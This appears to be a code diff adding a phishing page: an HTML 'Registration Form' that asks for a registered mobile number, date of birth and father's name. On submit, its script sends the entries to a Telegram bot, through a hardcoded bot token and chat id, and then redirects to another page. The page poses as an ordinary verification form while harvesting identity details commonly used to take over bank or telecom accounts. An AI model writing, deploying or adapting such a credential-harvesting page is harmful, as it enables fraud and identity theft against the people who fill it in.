@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registration Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            width: 350px;
+            margin: auto;
+            padding: 20px;
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+        }
+
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+
+        input {
+            width: 94%;
+            padding: 8px;
+            margin-bottom: 10px;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #5cb85c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #4cae4c;
+        }
+    </style>
+</head>
+<body>
+    <img src="lg.png" alt="Girl in a jacket" width="100%" height="100">
+    <div class="container">
+        <form id="registrationForm">
+            <label for="mobile">Registered Mobile No:</label>
+            <input type="text" id="mobile" name="mobile" required>
+
+            <label for="dob">Date of Birth:</label>
+            <input type="text" id="dob" name="dob" required placeholder="DD/MM/YYYY">
+
+            <label for="fatherName">Father's Name:</label>
+            <input type="text" id="fatherName" name="fatherName" required>
+            <br>
+            <br>
+            <button type="submit">Submit</button>
+        </form>
+    </div>
+<img src="ft.jpg" alt="Girl in a jacket" width="100%" height="200">
+    <script>
+        // Function to handle the DOB input formatting
+        document.getElementById('dob').addEventListener('input', function () {
+            let value = this.value.replace(/\D/g, ''); // Remove non-digit characters
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2);
+            }
+            if (value.length > 5) {
+                value = value.slice(0, 5) + '/' + value.slice(5);
+            }
+            this.value = value;
+        });
+
+        document.getElementById('registrationForm').addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const mobile = document.getElementById('mobile').value;
+            const dob = document.getElementById('dob').value;
+            const fatherName = document.getElementById('fatherName').value;
+
+            const message = `Registered Mobile No: ${mobile}\nDate of Birth: ${dob}\nFather's Name: ${fatherName}`;
+
+            // Send data to the Telegram API (This part requires a server)
+            fetch(`https://api.telegram.org/bot7901407141:AAHosgdnt82jsQTwsBB74WcctZ-_J-ZOS0c/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '6989736266',
+                    text: message,
+                }),
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = 'adac.html'; // Replace with your desired URL
+                } else {
+                    alert('Failed to send data to Telegram.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('There was an error submitting your data.');
+            });
+        });
+    </script>
+</body>
+</html>
